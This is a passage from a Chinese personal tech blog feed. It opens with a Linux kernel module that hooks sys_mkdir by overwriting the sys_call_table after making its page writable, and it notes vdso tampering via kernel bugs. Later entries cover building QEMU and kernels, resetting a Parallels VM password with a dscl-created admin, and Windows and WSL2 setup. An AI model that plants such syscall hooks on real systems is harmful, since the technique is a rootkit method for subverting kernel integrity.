href="#对于syscall的hook" class="headerlink" title="对于syscall的hook"></a>对于syscall的hook</h2><pre><code class="c">#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;#include&lt;linux/moduleparam.h&gt;#include&lt;linux/unistd.h&gt;#include&lt;linux/sched.h&gt;#include&lt;linux/syscalls.h&gt;#include&lt;linux/string.h&gt;#include&lt;linux/fs.h&gt;#include&lt;linux/fdtable.h&gt;#include&lt;linux/uaccess.h&gt;#include &lt;linux/kallsyms.h&gt;#include&lt;linux/rtc.h&gt;#include&lt;linux/vmalloc.h&gt;#include &lt;linux/slab.h&gt;//module macrosMODULE_LICENSE(&quot;GPL&quot;);MODULE_DESCRIPTION(&quot;hook sys_mkdir&quot;);//module constructor/destructortypedef unsigned long (*sys_call_ptr_t)(void);sys_call_ptr_t *_sys_call_table = NULL;typedef asmlinkage long (*old_mkdir_t)(const char __user *pathname, umode_t mode);old_mkdir_t old_mkdir = NULL;// hooked mkdir functionasmlinkage long hooked_mkdir(const char __user *pathname, umode_t mode) &#123;        printk(&quot;hooked sys_mkdir(), mkdir name: &quot;);        printk(pathname);        old_mkdir(pathname, mode);&#125;// memory protection shinanigansunsigned int level;pte_t *pte;//obtain sys_call_tablestatic int get_sys_call_table(void)&#123;    unsigned long tmp_sys_call_table = 0;    int ans = 0;    tmp_sys_call_table = kallsyms_lookup_name(&quot;sys_call_table&quot;);    if(tmp_sys_call_table != 0)    &#123;        ans = 1;        _sys_call_table = tmp_sys_call_table;        printk(&quot;[+] find sys_call_table: 0x%lx\n&quot;, tmp_sys_call_table);    &#125;    return ans;&#125;// initialize the modulestatic int hooked_init(void) &#123;    printk(&quot;+ Loading hook_mkdir module\n&quot;);    if(!get_sys_call_table())&#123;        return 0;    &#125;    // now we can hook syscalls ...such as uname    // first, save the old gate (fptr)    old_mkdir = (old_mkdir_t) _sys_call_table[__NR_mkdir];    // unprotect sys_call_table memory page    pte = lookup_address((unsigned long) _sys_call_table, &amp;level);    // change PTE to allow writing    set_pte_atomic(pte, pte_mkwrite(*pte));    printk(&quot;+ unprotected kernel memory page containing sys_call_table\n&quot;);    // now overwrite the __NR_uname entry with address to our uname    _sys_call_table[__NR_mkdir] = (sys_call_ptr_t) hooked_mkdir;    printk(&quot;+ sys_mkdir hooked!\n&quot;);    return 0;&#125;static void hooked_exit(void) &#123;    if(old_mkdir != NULL) &#123;        // restore sys_call_table to original state        _sys_call_table[__NR_mkdir] = (sys_call_ptr_t) old_mkdir;        // reprotect page        set_pte_atomic(pte, pte_clear_flags(*pte, _PAGE_RW));    &#125;    printk(&quot;+ Unloading hook_mkdir module\n&quot;);&#125;/*entry/exit macros*/module_init(hooked_init);module_exit(hooked_exit);</code></pre><h2 id="对于vdso的hook"><a href="#对于vdso的hook" class="headerlink" title="对于vdso的hook"></a>对于vdso的hook</h2><h3 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h3><ul><li>利用内核漏洞rce改到用户态可写，然后修改vdso</li><li>利用内核任意写漏洞进行修改vdso</li></ul><p>前提是，你得有能用的内核洞！！！！！</p><h3 id="修改源码"><a href="#修改源码" class="headerlink" title="修改源码"></a>修改源码</h3><p>直接修改linux内核源码，重新编译</p><p>修改sources.list</p><pre><code class="bash">sed -i &#39;s/# deb-src/deb-src/g&#39; /etc/apt/sources.list;</code></pre><p>获取源码</p><pre><code class="bash">apt-cache search linux-sourceapt-get source linux-source-5.4.0</code></pre><p>or</p><pre><code class="bash">apt-get install linux-source-5.4.0</code></pre><p>编译过程</p><pre><code class="bash">sudo su;apt-get install -y build-essential kernel-package bison libncurses5-dev libssl-dev build-essential openssl zlibc minizip libidn11-dev libidn11;make mrproper &amp;&amp; make clean &amp;&amp; make menuconfig;make -j8;make modules_install;make install;reboot;</code></pre><p>ubuntu18以上加上</p><pre><code class="bash">apt-get install flex libelf-dev;</code></pre><p>需要精简一点的话</p><pre><code class="bash">make localmodconfigmake menuconfig</code></pre><p>联合起来</p><pre><code class="bash">make mrproper &amp;&amp; make clean &amp;&amp; make localmodconfig &amp;&amp; time make -j40 &amp;&amp; make modules_install &amp;&amp; make install &amp;&amp; rebootmake mrproper &amp;&amp; make clean &amp;&amp; make localmodconfig &amp;&amp; time make -j32 &amp;&amp; make modules_install &amp;&amp; make install &amp;&amp; rebootmake mrproper &amp;&amp; make clean &amp;&amp; make localmodconfig &amp;&amp; time make -j24 &amp;&amp; make modules_install &amp;&amp; make install &amp;&amp; rebootmake mrproper &amp;&amp; make clean &amp;&amp; make localmodconfig &amp;&amp; time make -j16 &amp;&amp; make modules_install &amp;&amp; make install &amp;&amp; rebootmake mrproper &amp;&amp; make clean &amp;&amp; make localmodconfig &amp;&amp; time make -j12 &amp;&amp; make modules_install &amp;&amp; make install &amp;&amp; rebootmake mrproper &amp;&amp; make clean &amp;&amp; make localmodconfig &amp;&amp; time make -j8 &amp;&amp; make modules_install &amp;&amp; make install &amp;&amp; reboot</code></pre><p>顺便丢一个编译时间的表，以后参考，都是<code>ubuntu20.04.1</code>，可能有其他因素影响，比如硬盘io</p><table><thead><tr><th align="center">CPU</th><th align="center">编译线程数</th><th align="center">时间</th></tr></thead><tbody><tr><td align="center">E5-2660v2*2</td><td align="center">40</td><td align="center">326</td></tr><tr><td align="center">I7-8700K</td><td align="center">12</td><td align="center">243</td></tr><tr><td align="center">I7-4790(hdd)</td><td align="center">8</td><td align="center">2471</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu编译安装qemu</title>
      <link href="/2020/09/10/ubuntu-bian-yi-an-zhuang-qemu/"/>
      <url>/2020/09/10/ubuntu-bian-yi-an-zhuang-qemu/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>通过ubuntu编译安装qemu</p><ul><li>ubuntu20.04.1</li><li>qemu v5.1.50</li></ul><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre><code class="bash">https://github.com/qemu/qemu.git</code></pre><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><pre><code class="bash">apt-get install -y htop gcc g++ libglib2.0-dev libpixman-1-dev make libgtk-3-dev;</code></pre><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><pre><code class="bash">mkdir buildcd build../configuremake -j4</code></pre><p>如果只编译x64</p><pre><code class="bash">../configure --target-list=x86_64-softmmu</code></pre><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li><p>直接安装</p><pre><code class="bash">sudo make install</code></pre></li><li><p>打包成deb</p><pre><code class="bash">sudo apt-get install checkinstall;sudo checkinstall make install</code></pre></li></ol><h2 id="安装镜像"><a href="#安装镜像" class="headerlink" title="安装镜像"></a>安装镜像</h2><pre><code class="bash">qemu-img create -f qcow2 alpine.img 1gqemu-system-x86_64 -enable-kvm -m 1024 -smp 4 alpine.img -cdrom ./alpine-standard-3.12.0-x86_64.iso -boot dc</code></pre><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><pre><code class="bash">qemu-system-x86_64 -enable-kvm -m 1024 -smp 4 alpine.img </code></pre><h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>如果win10 同时安装了hyper-v和vmware<br>vmware是无法进行嵌套虚拟化，因为hyper-v已经虚拟化了宿主机了<br>所以用hyper-v调试时候，就不要用hyper-v和wsl2了<br><a href="https://docs.vmware.com/cn/VMware-Workstation-Pro/15.5/rn/VMware-Workstation-1555-Pro-Release-Notes.html">https://docs.vmware.com/cn/VMware-Workstation-Pro/15.5/rn/VMware-Workstation-1555-Pro-Release-Notes.html</a></p>]]></content>
      
      
      <categories>
          
          <category> virtualization </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于parallels重置密码的一些记录</title>
      <link href="/2020/09/06/guan-yu-parallels-chong-zhi-mi-ma-de-yi-xie-ji-lu/"/>
      <url>/2020/09/06/guan-yu-parallels-chong-zhi-mi-ma-de-yi-xie-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>parallels 14.1.3<br>虚拟机macos 10.15.6<br>前提是对用户写了ssh公钥，只是忘了密码无法登陆</p><h2 id="重置root密码"><a href="#重置root密码" class="headerlink" title="重置root密码"></a>重置root密码</h2><p>网上找的</p><pre><code class="bash">#!/bin/bash# reset passowrd of parallels desktop VMs#author tlanyan&lt;tlanyan@hotmail.com&gt;prlctl list -amachines=`prlctl list -a|sed &#39;1d&#39;`count=`echo &quot;$machines&quot;|wc -l`((count--))read -p &quot;please select vm index[0-$count]:&quot; indexif [ $index -gt $count ]; then    echo &quot;invlid choice!&quot;    exitfi((index++))line=`echo &quot;$machines&quot; | sed -n $&#123;index&#125;p`echo your choice: $lineid=`echo &quot;$line&quot; | tr &#39;&#123;&#125;&#39; &#39;  &#39; | awk &#39;&#123;print $1&#125;&#39;`read -p &quot;please input username:&quot; usernameread -p &quot;release input password:&quot; passwordprlctl set $id --userpasswd $username:$password</code></pre><h2 id="创建一个管理员用户"><a href="#创建一个管理员用户" class="headerlink" title="创建一个管理员用户"></a>创建一个管理员用户</h2><p>ssh上去 su到root</p><pre><code class="bash">dscl . -create /Users/papadscl . -create /Users/papa UserShell /bin/bashdscl . -create /Users/papa RealName &quot;papa&quot;#保证UniqueID唯一dscl . -create /Users/papa UniqueID &quot;555&quot;dscl . -create /Users/papa PrimaryGroupID 80dscl . -create /Users/papa NFSHomeDirectory /Users/papa#修改密码:dscl . -passwd /Users/papa password#加入admin用户组dscl . -append /Groups/admin GroupMembership papa</code></pre><h2 id="通过gui登陆进去"><a href="#通过gui登陆进去" class="headerlink" title="通过gui登陆进去"></a>通过gui登陆进去</h2><p>在系统偏好设置中的用户与用户组中修改愿管理员密码</p><h2 id="删除管理员用户"><a href="#删除管理员用户" class="headerlink" title="删除管理员用户"></a>删除管理员用户</h2><pre><code class="bash">dscl . -delete /Groups/admin GroupMembership papa</code></pre><h2 id="在虚拟机页面备注密码"><a href="#在虚拟机页面备注密码" class="headerlink" title="在虚拟机页面备注密码"></a>在虚拟机页面备注密码</h2><p>避免下次遗忘</p>]]></content>
      
      
      <categories>
          
          <category> repair </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Parallels </tag>
            
            <tag> reset password </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsphere关于windows模版的一些笔记</title>
      <link href="/2020/08/28/vsphere-guan-yu-windows-mo-ban-de-yi-xie-bi-ji/"/>
      <url>/2020/08/28/vsphere-guan-yu-windows-mo-ban-de-yi-xie-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>关于vsphere windows类系统的模版所包含的一些步骤<br>比较符合个人习惯的</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>开启mstsc，取消仅允许运行使用网络级别身份验证的远程桌面的计算机连接</li><li>设置输入法默认为英文</li><li>电源选择为不休眠，关闭显示屏</li><li>安装7zip,chrome,miniconda3,everything,sublime text3</li><li>chrome首页设置为<code>https://www.baidu.com/?pu=sz%401321_480&amp;wpo=btmfast</code>,搜索设置为bing，开启下载询问。chrome固定到任务栏</li><li>取消复选框，显示隐藏文件,打开拓展名</li><li>安装windows terminal</li><li>安装vmtools并且自动更新</li><li>进行激活</li><li>桌面个性化设置，cortana隐藏搜索栏</li><li>取消onedrive开机启动</li><li>快捷栏去除不需要的图标</li><li>退出安装光盘</li><li>sublime设置为<pre><code class="html">&#123;&quot;font_size&quot;: 18,&quot;ignored_packages&quot;:[    &quot;Vintage&quot;],&quot;tab_size&quot;: 4,&quot;translate_tabs_to_spaces&quot;: true,&quot;update_check&quot;: false,&quot;word_wrap&quot;:true&#125;</code></pre></li><li>打开粘贴板历史记录</li><li>设置代理</li></ol><h2 id="安装windows-terminal"><a href="#安装windows-terminal" class="headerlink" title="安装windows terminal"></a>安装windows terminal</h2><p>基本上参考 <a href="https://zhuanlan.zhihu.com/p/137595941">https://zhuanlan.zhihu.com/p/137595941</a></p><h3 id="1-Microsoft-Store-下载安装-Windows-Terminal"><a href="#1-Microsoft-Store-下载安装-Windows-Terminal" class="headerlink" title="1. Microsoft Store 下载安装 Windows Terminal"></a>1. Microsoft Store 下载安装 Windows Terminal</h3><h3 id="2-安装Fira-code字体"><a href="#2-安装Fira-code字体" class="headerlink" title="2. 安装Fira code字体"></a>2. 安装Fira code字体</h3><pre><code class="bash">https://github.com/tonsky/FiraCode/releases</code></pre><p>选择最新的下载，然后ttf文件夹下全选安装</p><h3 id="3-安装新款-Powershell-Core"><a href="#3-安装新款-Powershell-Core" class="headerlink" title="3. 安装新款 Powershell Core"></a>3. 安装新款 Powershell Core</h3><pre><code class="bash">https://github.com/PowerShell/PowerShell/releases</code></pre><p>选择合适架构下载安装</p><h3 id="4-安装Powershell插件"><a href="#4-安装Powershell插件" class="headerlink" title="4. 安装Powershell插件"></a>4. 安装Powershell插件</h3><p>打开刚装好的新版 powershell</p><pre><code class="powershell"># 1. 安装 PSReadline 包，该插件可以让命令行很好用，类似 zshInstall-Module -Name PSReadLine -AllowPrerelease -Force -Verbose# 2. 安装 posh-git 包，让你的 git 更好用Install-Module posh-git -Scope CurrentUser -Verbose# 3. 安装 oh-my-posh 包，让你的命令行更酷炫、优雅Install-Module oh-my-posh -Scope CurrentUser -Verbose</code></pre><p>有不信任直接<code>Y</code></p><h3 id="5-配置-Windows-Terminal"><a href="#5-配置-Windows-Terminal" class="headerlink" title="5. 配置 Windows Terminal"></a>5. 配置 Windows Terminal</h3><p>settings.json<br>注意修改commandline</p><pre><code class="json">// This file was initially generated by Windows Terminal 1.0.1401.0// It should still be usable in newer versions, but newer versions might have additional// settings, help text, or changes that you will not see unless you clear this file// and let us generate a new one for you.// To view the default settings, hold &quot;alt&quot; while clicking on the &quot;Settings&quot; button.// For documentation on these settings, see: https://aka.ms/terminal-documentation&#123;  &quot;$schema&quot;: &quot;https://aka.ms/terminal-profiles-schema&quot;,  //&quot;defaultProfile&quot;: &quot;&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;&quot;,  &quot;defaultProfile&quot;: &quot;&#123;574e775e-4f2a-5b96-ac1e-a2962a402336&#125;&quot;,  // You can add more global application settings here.  // To learn more about global settings, visit https://aka.ms/terminal-global-settings  // If enabled, selections are automatically copied to your clipboard.  &quot;copyOnSelect&quot;: true,  // If enabled, formatted data is also copied to your clipboard  &quot;copyFormatting&quot;: false,  // A profile specifies a command to execute paired with information about how it should look and feel.  // Each one of them will appear in the &#39;New Tab&#39; dropdown,  //   and can be invoked from the commandline with `wt.exe -p xxx`  // To learn more about profiles, visit https://aka.ms/terminal-profile-settings  &quot;profiles&quot;: &#123;    &quot;defaults&quot;: &#123;      //   // Put settings here that you want to apply to all profiles.      //   &quot;initialCols&quot;: 120,      //   &quot;initialRows&quot;: 30,      //   &quot;useAcrylic&quot;: false,      //   //&quot;backgroundImage&quot;: &quot;C:\\Users\\xyzz\\Pictures\\Camera Roll\\v2-ff0bf88c3ae2817aabbe0a3346b57547_r.jpg&quot;,      //   &quot;backgroundImageOpacity&quot;: 0.8,      //   // 亮色或暗色主题，可选值 &quot;light&quot;, &quot;dark&quot;, &quot;system&quot;      //   &quot;requestedTheme&quot;: &quot;Snazzy&quot;,      //   // 合并标题栏和标签栏      //   &quot;showTabsInTitlebar&quot;: true,      //   // 如果 showTabsInTitlebar 与本值同为 false 时，自动隐藏标签栏      //   &quot;alwaysShowTabs&quot;: true,      //   // 在标题栏上显示当前活动标签页的标题      //   &quot;showTerminalTitleInTitlebar&quot;: true,      //   // 双击选择时用于分词的字符      //   &quot;wordDelimiters&quot;: &quot; /\\()\&quot;&#39;-.,:;&lt;&gt;~!@#$%^&amp;*|+=[]&#123;&#125;~?\u2502&quot;,      //   // 选择时复制到剪贴板      //   &quot;copyOnSelect&quot;: true,      //   &quot;foreground&quot;: &quot;#2BB3D5&quot;    &#125;,    &quot;list&quot;: [      &#123;        // Powershell 7.1.0-preview.2 配置        &quot;guid&quot;: &quot;&#123;574e775e-4f2a-5b96-ac1e-a2962a402336&#125;&quot;,        &quot;hidden&quot;: false,        &quot;name&quot;: &quot;pwsh&quot;,        // 注意：一定要写上 -nologo，否则开启 powershll 会有一段话输出，很讨厌！        // 这儿看个人的位置        &quot;commandline&quot;: &quot;C:/Program Files/PowerShell/7-preview/pwsh.exe -nologo&quot;,        &quot;source&quot;: &quot;Windows.Terminal.PowershellCore&quot;,        // 启动菜单一定要设置为 &lt;.&gt;，否则后面重要的一步将会无效！        &quot;startingDirectory&quot;: &quot;.&quot;,        // 字体        &quot;fontFace&quot;: &quot;Fira Code&quot;,        &quot;fontSize&quot;: 11,        &quot;historySize&quot;: 9001,        &quot;padding&quot;: &quot;5, 5, 20, 25&quot;,        &quot;snapOnInput&quot;: true,        &quot;useAcrylic&quot;: false,        // 颜色        &quot;colorScheme&quot;: &quot;Snazzy&quot;      &#125;,      &#123;        // Make changes here to the powershell.exe profile.        &quot;guid&quot;: &quot;&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;&quot;,        &quot;name&quot;: &quot;Windows PowerShell&quot;,        &quot;commandline&quot;: &quot;powershell.exe&quot;,        &quot;hidden&quot;: false      &#125;,      &#123;        // Make changes here to the cmd.exe profile.        &quot;guid&quot;: &quot;&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;&quot;,        &quot;name&quot;: &quot;命令提示符&quot;,        &quot;commandline&quot;: &quot;cmd.exe&quot;,        &quot;hidden&quot;: false      &#125;      //,&#123;      //  &quot;guid&quot;: &quot;&#123;574e775e-4f2a-5b96-ac1e-a2962a402336&#125;&quot;,      //  &quot;hidden&quot;: false,      //  &quot;name&quot;: &quot;PowerShell&quot;,      //  &quot;source&quot;: &quot;Windows.Terminal.PowershellCore&quot;      //&#125;    ]  &#125;,  // Add custom color schemes to this array.  // To learn more about color schemes, visit https://aka.ms/terminal-color-schemes  &quot;schemes&quot;: [    &#123;      &quot;name&quot;: &quot;Snazzy&quot;,      &quot;black&quot;: &quot;#000000&quot;,      &quot;red&quot;: &quot;#fc4346&quot;,      &quot;green&quot;: &quot;#50fb7c&quot;,      &quot;yellow&quot;: &quot;#f0fb8c&quot;,      &quot;blue&quot;: &quot;#49baff&quot;,      &quot;purple&quot;: &quot;#fc4cb4&quot;,      &quot;cyan&quot;: &quot;#8be9fe&quot;,      &quot;white&quot;: &quot;#ededec&quot;,      &quot;brightBlack&quot;: &quot;#555555&quot;,      &quot;brightRed&quot;: &quot;#fc4346&quot;,      &quot;brightGreen&quot;: &quot;#50fb7c&quot;,      &quot;brightYellow&quot;: &quot;#f0fb8c&quot;,      &quot;brightBlue&quot;: &quot;#49baff&quot;,      &quot;brightPurple&quot;: &quot;#fc4cb4&quot;,      &quot;brightCyan&quot;: &quot;#8be9fe&quot;,      &quot;brightWhite&quot;: &quot;#ededec&quot;,      &quot;background&quot;: &quot;#1e1f29&quot;,      &quot;foreground&quot;: &quot;#ffffff&quot;    &#125;,    &#123;      &quot;name&quot;: &quot;Homebrew&quot;,      &quot;black&quot;: &quot;#000000&quot;,      &quot;red&quot;: &quot;#FC5275&quot;,      &quot;green&quot;: &quot;#00a600&quot;,      &quot;yellow&quot;: &quot;#999900&quot;,      &quot;blue&quot;: &quot;#6666e9&quot;,      &quot;purple&quot;: &quot;#b200b2&quot;,      &quot;cyan&quot;: &quot;#00a6b2&quot;,      &quot;white&quot;: &quot;#bfbfbf&quot;,      &quot;brightBlack&quot;: &quot;#666666&quot;,      &quot;brightRed&quot;: &quot;#e50000&quot;,      &quot;brightGreen&quot;: &quot;#00d900&quot;,      &quot;brightYellow&quot;: &quot;#e5e500&quot;,      &quot;brightBlue&quot;: &quot;#0000ff&quot;,      &quot;brightPurple&quot;: &quot;#e500e5&quot;,      &quot;brightCyan&quot;: &quot;#00e5e5&quot;,      &quot;brightWhite&quot;: &quot;#e5e5e5&quot;,      &quot;background&quot;: &quot;#283033&quot;,      &quot;foreground&quot;: &quot;#ffffff&quot;    &#125;  ],  // Add custom keybindings to this array.  // To unbind a key combination from your defaults.json, set the command to &quot;unbound&quot;.  // To learn more about keybindings, visit https://aka.ms/terminal-keybindings  &quot;keybindings&quot;: [    // Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json.    // These two lines additionally bind them to Ctrl+C and Ctrl+V.    // To learn more about selection, visit https://aka.ms/terminal-selection    &#123;      &quot;command&quot;: &#123;        &quot;action&quot;: &quot;copy&quot;,        &quot;singleLine&quot;: false      &#125;,      &quot;keys&quot;: &quot;ctrl+c&quot;    &#125;,    &#123;      &quot;command&quot;: &quot;paste&quot;,      &quot;keys&quot;: &quot;ctrl+v&quot;    &#125;,    // Press Ctrl+Shift+F to open the search box    &#123;      &quot;command&quot;: &quot;find&quot;,      &quot;keys&quot;: &quot;ctrl+shift+f&quot;    &#125;,    // Press Alt+Shift+D to open a new pane.    // - &quot;split&quot;: &quot;auto&quot; makes this pane open in the direction that provides the most surface area.    // - &quot;splitMode&quot;: &quot;duplicate&quot; makes the new pane use the focused pane&#39;s profile.    // To learn more about panes, visit https://aka.ms/terminal-panes    &#123;      &quot;command&quot;: &#123;        &quot;action&quot;: &quot;splitPane&quot;,        &quot;split&quot;: &quot;auto&quot;,        &quot;splitMode&quot;: &quot;duplicate&quot;      &#125;,      &quot;keys&quot;: &quot;alt+shift+d&quot;    &#125;  ]&#125;</code></pre><h3 id="6-右键配置"><a href="#6-右键配置" class="headerlink" title="6. 右键配置"></a>6. 右键配置</h3><p>保存为<code>right_click.reg</code><br>修改自己的位置<br>Icon 根据需求自己配，我就直接放弃了<br><img src="/img/2020/08/28/terminal.ico" alt="terminal.ico"></p><pre><code class="bash">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\shell\WindowsTerminal]@=&quot;Open Windows Terminal here&quot;&quot;Icon&quot;=&quot;C:\\Users\\xyzz\\AppData\\Local\\WTerminal\\terminal.ico&quot;[HKEY_CLASSES_ROOT\Directory\shell\WindowsTerminal\command]@=&quot;C:\\Users\\xyzz\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe -d %V&quot;[HKEY_CLASSES_ROOT\Directory\Background\shell\WindowsTerminal]@=&quot;Open Windows Terminal here&quot;&quot;Icon&quot;=&quot;C:\\Users\\xyzz\\AppData\\Local\\WTerminal\\terminal.ico&quot;[HKEY_CLASSES_ROOT\Directory\Background\shell\WindowsTerminal\command]@=&quot;C:\\Users\\xyzz\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe -d %V&quot;</code></pre><h3 id="7-主题配置"><a href="#7-主题配置" class="headerlink" title="7. 主题配置"></a>7. 主题配置</h3><p><code>notepad $PROFILE</code></p><pre><code class="poweshell">&lt;# * FileName: Microsoft.PowerShell_profile.ps1 * Author: 刘 鹏 * Email: littleNewton6@outlook.com * Date: 2020, May. 1 * Copyright: No copyright. You can use this code for anything with no warranty.#&gt;#------------------------------- Import Modules BEGIN -------------------------------# 引入 posh-gitImport-Module posh-git# 引入 oh-my-poshImport-Module oh-my-posh# 设置 PowerShell 主题Set-Theme Paradox#------------------------------- Import Modules END   -------------------------------#-------------------------------  Set Hot-keys BEGIN  -------------------------------# 设置 Tab 键补全# Set-PSReadlineKeyHandler -Key Tab -Function Complete# 设置 Ctrl+d 为菜单补全和 IntellisenseSet-PSReadLineKeyHandler -Key &quot;Tab&quot; -Function MenuComplete# 设置 Ctrl+d 为退出 PowerShellSet-PSReadlineKeyHandler -Key &quot;Ctrl+d&quot; -Function ViExit# 设置 Ctrl+z 为撤销Set-PSReadLineKeyHandler -Key &quot;Ctrl+z&quot; -Function Undo# 设置向上键为后向搜索历史记录Set-PSReadLineKeyHandler -Key UpArrow -Function HistorySearchBackward# 设置向下键为前向搜索历史纪录Set-PSReadLineKeyHandler -Key DownArrow -Function HistorySearchForward#-------------------------------  Set Hot-keys END    -------------------------------#-------------------------------    Functions BEGIN   -------------------------------# Python 直接执行$env:PATHEXT += &quot;;.py&quot;# 更新 pip 的方法function Update-Packages &#123;    # update pip    Write-Host &quot;Step 1: 更新 pip&quot; -ForegroundColor Magenta -BackgroundColor Cyan    $a = pip list --outdated    $num_package = $a.Length - 2    for ($i = 0; $i -lt $num_package; $i++) &#123;        $tmp = ($a[2 + $i].Split(&quot; &quot;))[0]        pip install -U $tmp    &#125;    # update TeX Live    $CurrentYear = Get-Date -Format yyyy    Write-Host &quot;Step 2: 更新 TeX Live&quot; $CurrentYear -ForegroundColor Magenta -BackgroundColor Cyan    tlmgr update --self    tlmgr update --all&#125;#-------------------------------    Functions END     -------------------------------#-------------------------------   Set Alias Begin    -------------------------------# 1. 编译函数 makefunction MakeThings &#123;    nmake.exe $args -nologo&#125;Set-Alias -Name make -Value MakeThings# 2. 更新系统 os-updateSet-Alias -Name os-update -Value Update-Packages# 3. 查看目录 ls &amp; llfunction ListDirectory &#123;    (Get-ChildItem).Name    Write-Host(&quot;&quot;)&#125;Set-Alias -Name ls -Value ListDirectorySet-Alias -Name ll -Value Get-ChildItem#-------------------------------    Set Alias END     -------------------------------</code></pre><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>windows 模版机over<br>删去快照，做成模版<br>由于是模板机，所以没有安装git，需要的时候再安装，但是保留了posh-git</p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>windows sublime添加右键文件夹脚本<br>1.reg</p><pre><code class="powershell">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT*\shell\SublimeText3]@=&quot;Open in SublimeText3&quot;&quot;Icon&quot;=&quot;\&quot;c:\Program Files\Sublime Text 3\sublime_text.exe\&quot;&quot;[HKEY_CLASSES_ROOT*\shell\SublimeText3\command]@=&quot;\&quot;c:\\Program Files\\Sublime Text 3\\sublime_text.exe\&quot; \&quot;%1\&quot;&quot;[HKEY_CLASSES_ROOT\Directory\shell\SublimeText3]@=&quot;Open Directory in SublimeText3&quot;&quot;Icon&quot;=&quot;\&quot;c:\\Program Files\\Sublime Text 3\\sublime_text.exe\&quot;&quot;[HKEY_CLASSES_ROOT\Directory\shell\SublimeText3\command]@=&quot;\&quot;c:\\Program Files\\Sublime Text 3\\sublime_text.exe\&quot; \&quot;%1\&quot;&quot;</code></pre><h2 id="更新2"><a href="#更新2" class="headerlink" title="更新2"></a>更新2</h2><p>添加cpu和内存的热插拔</p>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
          <category> frequent </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vsphere </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10 2004版本的一些折腾</title>
      <link href="/2020/08/28/win10-2004-ban-ben-de-yi-xie-zhe-teng/"/>
      <url>/2020/08/28/win10-2004-ban-ben-de-yi-xie-zhe-teng/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>包含以下内容</p><ul><li>win10 2004 hyper-V vmware共存</li><li>win10 开启sandbox</li><li>win10 开启wsl2</li><li>wsl2的备份与还原</li><li>wsl2安装docker</li></ul><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>开启以下功能</p><ul><li>Hyper-v</li><li>Windows 沙盒</li><li>适用于Linux的Windows子系统</li><li>虚拟机平台</li></ul><p>安装完了重启就完事了</p><h2 id="win10-2004-hyper-V-vmware共存"><a href="#win10-2004-hyper-V-vmware共存" class="headerlink" title="win10 2004 hyper-V vmware共存"></a>win10 2004 hyper-V vmware共存</h2><p>升级vmware到15.5以上然后就兼容了</p><h2 id="win10-开启sandbox"><a href="#win10-开启sandbox" class="headerlink" title="win10 开启sandbox"></a>win10 开启sandbox</h2><p>安装完功能就自动开启了<br>发现报error 什么文件没找到，重启就完事了</p><h2 id="win10-开启wsl2"><a href="#win10-开启wsl2" class="headerlink" title="win10 开启wsl2"></a>win10 开启wsl2</h2><p>先开启就是全局，自动就是wsl2了</p><pre><code class="powershell">wsl --set-default-version 2</code></pre><p>出现问题安装<a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi</a></p><p>查看版本</p><pre><code class="powershell">wsl --list --verbose</code></pre><p>对wsl进行全局配置，不让容易占用太多内存<br>位置<code>%USERPROFILE%/.wslconfig</code></p><pre><code class="python">[wsl2]memory=4GBswap=0localhostForwarding=true</code></pre><p>先关闭再启动就可以了</p><pre><code class="powershell">wsl --shutdown</code></pre><p>还可以通过processors设置使用的cpu数量,具体的见官方手册<br><a href="https://docs.microsoft.com/zh-cn/windows/wsl/wsl-config#set-a-default-distribution">https://docs.microsoft.com/zh-cn/windows/wsl/wsl-config#set-a-default-distribution</a></p><h2 id="wsl2的备份与还原"><a href="#wsl2的备份与还原" class="headerlink" title="wsl2的备份与还原"></a>wsl2的备份与还原</h2><p>备份</p><pre><code class="powershell">wsl --export ubuntu d:/ubuntu.tar</code></pre><p>删除</p><pre><code class="powershell">wsl --unregister ubuntu</code></pre><p>还原，同时可以指定位置</p><pre><code class="powershell">wsl --import ubuntu d:/wsl d:/ubuntu.tar</code></pre><p>如果发现回来是root用户,通过下面命令修改默认用户</p><pre><code class="powershell">ubuntu config 